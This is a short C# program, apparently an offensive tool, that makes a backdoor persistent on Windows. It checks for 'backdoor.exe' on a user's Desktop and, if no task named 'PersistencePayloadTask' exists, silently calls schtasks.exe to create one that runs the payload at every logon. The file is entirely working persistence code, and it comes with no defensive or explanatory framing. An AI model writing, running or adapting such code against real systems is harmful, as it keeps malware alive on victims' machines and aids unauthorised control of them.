// compile: mcs -target:exe -out:persistence.exe persistence-onlogon.cs

using System;
using System.Diagnostics;
using System.IO;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            string payloadPath = @"C:\Users\username\Desktop\backdoor.exe";

            // Check if the payload exists
            if (!File.Exists(payloadPath))
            {
                Console.WriteLine("Payload not found!");
                return;
            }

            string taskName = "PersistencePayloadTask";

            // Check if the task already exists
            string queryTask = $"/query /tn \"{taskName}\"";
            Process queryProcess = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = queryTask,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };
            queryProcess.Start();
            string output = queryProcess.StandardOutput.ReadToEnd();
            queryProcess.WaitForExit();

            if (!output.Contains(taskName))
            {
                // Schedule the task
                string scheduleTask = $"/create /tn \"{taskName}\" /tr \"{payloadPath}\" /sc onlogon /f";
                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = scheduleTask,
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                Console.WriteLine("Task created successfully.");
            }
            else
            {
                Console.WriteLine("Task already exists.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}

